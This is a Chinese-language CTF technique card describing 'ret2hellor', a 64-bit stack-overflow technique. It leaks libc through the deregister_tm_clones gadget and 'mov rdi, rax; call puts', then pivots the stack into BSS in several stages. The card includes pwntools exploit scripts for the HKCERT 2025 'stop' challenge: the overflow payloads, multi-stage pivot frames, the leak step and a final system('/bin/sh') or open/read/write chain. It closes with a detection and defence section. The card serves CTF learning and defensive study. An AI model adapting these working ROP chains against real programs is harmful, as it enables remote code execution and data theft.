---
id: binary-pwn-stack-ret2hellor-deregister-tm-clones-bss-migration
title: ret2hellor：无 pop rdi 时借 deregister_tm_clones + mov rdi,rax;call puts 泄露 libc，并用 BSS 多段迁移构造 ORW/system 链
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2hellor-deregister-tm-clones-bss-migration
aliases:
- ret2hellor
- ret2all 替代
- deregister_tm_clones 泄露
- __bss_start 泄露
- 无 pop rdi 泄露 libc
- mov rdi, rax; call puts
- BSS 多段栈迁移
- HKCERT 2025 stop
tags:
- pwn
- stack
- rop
- ret2libc
- no-pop-rdi
- deregister-tm-clones
- bss-migration
- libc-leak
- seccomp
- orw
- glibc239
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V180
  verified_at: '2026-11-06T17:10:00+08:00'
  notes: 已对照原文核对：图2确认 deregister_tm_clones 为 mov eax,__bss_start;cmp rax;__bss_start，0x4010D0/0x40101a/0x4012B0/0x2045c0、阶段三 off=0x60/off2=0xa00/0x21b780 均与原文一致；未在本机复跑
---

## 一句话结论

高版本题目没有可用的 `pop rdi; ret` 时，可以调用编译器生成的 `deregister_tm_clones` 片段把 `RAX` 置为 `&__bss_start`，再借 `mov rdi, rax; call puts` 打印该地址处存放的指针（示例 glibc 2.39 下是 libc 指针）完成泄露；若该处为 0，则用多段 `read`/`leave; ret` 把假栈帧迁到 BSS，先写入非零值/布置好帧，再泄露 libc 并接 system 或 open/read/write ORW。这套模板即 ret2hellor。

## 原理

- **问题**：常规 ret2libc 需要 `pop rdi; ret` 设置第一个参数；高版本 libc/二进制可能没有这个片段，或题目用 seccomp 只允许 ORW、用 read 限定输入使 ret2all/SROP 的栈布局非常繁琐。
- **`deregister_tm_clones` 片段**：GCC/glibc 生成的 `deregister_tm_clones` 通常包含：
  ```text
  mov eax, offset __bss_start
  cmp rax, offset __bss_start
  jz  locret
  ...
  locret: ret
  ```
  从片段入口执行后，`RAX` 被置为 `&__bss_start` 并返回；它把“一个固定可写地址”放进了 RAX，而不依赖栈上的 `pop rdi`。
- **`mov rdi, rax; call puts`**：紧跟其后的另一个小片段把 RAX 移入 RDI 并调用 `puts`，于是变成 `puts(&__bss_start)`：打印该地址起始的 8 字节内容。若该位置存放的是 libc 指针（示例中 `stdout@GLIBC`/`_IO_2_1_stdout_` 指针落在 BSS/GOT 附近），就泄露 libc；文章 HKCERT 2025 `stop` 示例用泄露值减 `0x2045c0` 得到 libc 基址。
- **为什么叫 ret2hellor**：它把“先找 pop rdi → 泄露 → 返回主函数 → 二次溢出”的多段 ret2libc 简化为“固定两个 gadget + puts”的模板；需要多次读写时，再用 BSS 假栈帧串起来。
- **阶段三（`__bss_start` 为 0 时）**：若目标 BSS 起始处没有 libc 指针（例如 tele 显示 `0x403348 = 0`），单靠泄露 gadget 打不出东西。此时利用程序自身的 `read` 和 `leave; ret`：
  1. 第一次溢出把返回地址改成 `bss+off2` 与 `read`，让下一次 read 把数据写到 BSS 高地址；
  2. 在 BSS 上布置 `bss+off2-off+0x10, deregister_gadget, puts` 的帧，并把返回改成 `bss+off*2` 与 `read`；
  3. 再布置 `bss+off2-off, leave_ret` 的帧，返回 `bss+off` 与 `read`；
  4. 发送一个非零字节（示例 `\x80`）写到 BSS 起始处，使后续泄露路径有内容可打印/通过判断；
  5. `puts` 泄露 libc 后，最后一次 `read` 写入 system 或 ORW 链。
  这就是“多段 BSS 迁移 + 栈风水”的完整模板。
- **ORW 适配**：示例 seccomp 只 KILL `execve`/`execveat`，其余 ALLOW，因此泄露 libc 后用 `open`/`read`/`write` 读 `./flag` 即可；libc 2.39 没有简单的 `pop rdx; ret`，文章改用 `pop rdx; xor eax,eax; pop rbx; pop r12; pop r13; pop rbp; ret`（libc+0xb503c）。
- **成立条件**：二进制非 PIE 或已泄露代码基址、能找到 `deregister_tm_clones` 与 `mov rdi, rax; call puts` 片段（或等价 `mov rdi, rax; call`）、目标地址可读且内容可泄露/可写；阶段三还需要可重复的 read 和可迁移的 BSS。

## 触发条件

- 64 位栈溢出，能控制返回地址并布置 ROP；二进制无 `pop rdi; ret` 或该片段不可用。
- 二进制中存在 `deregister_tm_clones`（常规 GCC 产物）和 `mov rdi, rax; call puts`/`mov rdi, rax; call` 片段；非 PIE 或已泄漏代码基址。
- 阶段二：`__bss_start`（或附近 GOT/数据槽）存放 libc 指针，且 `puts` 可打印；阶段三：该处为 0，但程序有 `read`+`leave; ret` 且可多次交互，BSS 可写。
- seccomp 可能只允许 ORW；需准备 open/read/write 链或 system（若 execve 未被禁）。
- 阶段三的 `off`、`off2`、BSS 地址、`read`/`puts`/`leave_ret` 偏移需按目标确定。

## 利用步骤

1. 检查 gadgets：`pop rdi`（阶段一）、`deregister_tm_clones` 入口、`mov rdi, rax; call puts`、`leave; ret`、`read` 调用点；确认 BSS 起始处内容（`tele`/`x/gx`）。
2. 阶段二（BSS 有 libc 指针）：
   - 溢出返回 `deregister_gadget`，再返回 `ret` 对齐，再返回 `mov rdi, rax; call puts`，最后返回 `main` 或 read；
   - 接收 puts 输出 6 字节，减偏移得到 libc；
   - 用 libc 的 `pop rdi`/`pop rsi`/`pop rdx` 片段构造 open/read/write（或 system）链。
3. 阶段三（BSS 为 0）：
   - 按模板依次发送三组 `read` 数据：先写到 `bss+off2`，再布置 `deregister+puts` 帧，再布置 `leave_ret` 帧；
   - 发送 `\x80` 等非零值写到 BSS 起始处，触发泄露；
   - 收到 libc 后发送最终 system/ORW 链。
4. 若 puts 在 read 后面导致返回路径不连续，按文章提示额外加一层栈迁移。
5. 用 gdb 在 `read`/`leave_ret`/`puts` 处断点校正 off/off2 与帧布局。

## PoC

阶段二（HKCERT 2025 `stop` 思路，无 pop rdi、seccomp 禁 execve）：

```python
pd  = b'a' * 0x78
pd += p64(0x401130)        # deregister_tm_clones 片段：RAX = &__bss_start
pd += p64(0x40101a)        # ret 对齐
pd += p64(0x4012B0)        # mov rdi, rax; call puts
pd += p64(elf.sym['main']) # 回到 main 继续第二次溢出
s(pd)
io.recvuntil(b'\n')
lib = u64(io.recv(6).ljust(8, b'\x00')) - 0x2045c0
# 之后用 libc 的 pop rdi/pop rsi/pop rdx + open/read/write 读 ./flag
```

阶段三模板（BSS 为 0 时；地址取自文章示例，需按目标重查）：

```python
ret, bss = 0x40101a, 0x404048
read, puts, leave_ret = 0x401226, 0x40121E, 0x401242
off, off2 = 0x60, 0xa00

# 1) 迁移到 BSS 高地址，下一次 read 写入假帧
pd = b'a' * off + flat(bss + off2, read)
io.send(pd)

# 2) 在 BSS 布置 deregister + puts 帧，并准备下一次 read
pd = flat(bss + off2 - off + 0x10, 0x4010D0, puts)
pd = pd.ljust(off, b'a') + flat(bss + off * 2, read)
io.send(pd)

# 3) 布置 leave_ret 帧，回落到 bss+off 的 read
pd = flat(bss + off2 - off, leave_ret)
pd = pd.ljust(off, b'\x00') + flat(bss + off, read)
io.send(pd)

# 4) 写入非零字节到 BSS 起始处，触发泄露
io.send(b'\x80')
lib = u64(io.recv(6).ljust(8, b'\x00')) - 0x21b780

# 5) 最终 system 链
pd = b'a' * off + p64(ret) + p64(lib + pop_rdi) + p64(lib + binsh) + p64(lib + system)
io.send(pd)
```

`0x4010D0`、`0x40121E`、`0x401226`、`0x401242`、`0x404048` 等均为文章示例地址；阶段三的 `\x80`、`off2` 与帧内容必须按实际二进制和 BSS 布局调整。

## 变体与关联

- **阶段一变体**：有 `pop rdi` 时就是标准 ret2libc：`pop rdi; puts@got; puts@plt; main` 泄露，再 `pop rdi; binsh; system`；本卡把它作为基线。
- **片段变体**：若没有 `deregister_tm_clones`，可找其他“`mov rax, imm; ...; ret`”或“`mov rdi, rax; call <函数>`”组合；也可用 `__libc_csu_init`/ret2csu、`ret2dlresolve`、SROP 替代。
- **阶段三替代**：若 BSS 不可写或不可迁移，可改用 `environ` 泄露/堆迁移；若 seccomp 只允许 read/write 不允许 open，需要 openat2/已有 fd。
- 关联：[[binary-pwn-stack-pivot-leave-ret-bss]]（leave;ret 迁移原理）、[[binary-pwn-rop-magic-gadget-csu-bss-write-orw-no-libc-leak]]（无 libc 泄露的 BSS/ORW 思路）、[[binary-pwn-stack-bss-pivot-write-gadget-chunked-orw]]（BSS 分块写 ORW）、[[binary-pwn-stack-ret2libc]]（标准 ret2libc 基线）。

## 检测与防御

- 代码/编译：栈溢出是根因，使用安全函数、FORTIFY_SOURCE、栈 canary；PIE + 完整 ASLR 使 gadget/BSS 地址不可预测；Full RELRO 减少 GOT 泄露点。
- gadget 层面：`deregister_tm_clones` 是编译器/启动代码生成的，难以彻底移除；可通过 PIE、CFI/CET（IBT/SHSTK）增加 ROP 难度，或裁剪 `__bss_start` 附近的 libc 指针。
- seccomp：使用 allowlist（只允许必要 syscall），不要只杀 `execve`；即使禁 execve，open/read/write 仍能读 flag。
- 检测：ROP 链返回地址落入 `deregister_tm_clones`/`mov rdi, rax; call puts` 等非正常调用点、BSS 出现可执行的假栈帧、进程在 `read`/`leave` 处反复迁移；栈溢出告警与崩溃转储。
- 事件响应：栈 ROP 通常直接导致 RCE/flag 读取，需重启并排查持久化。
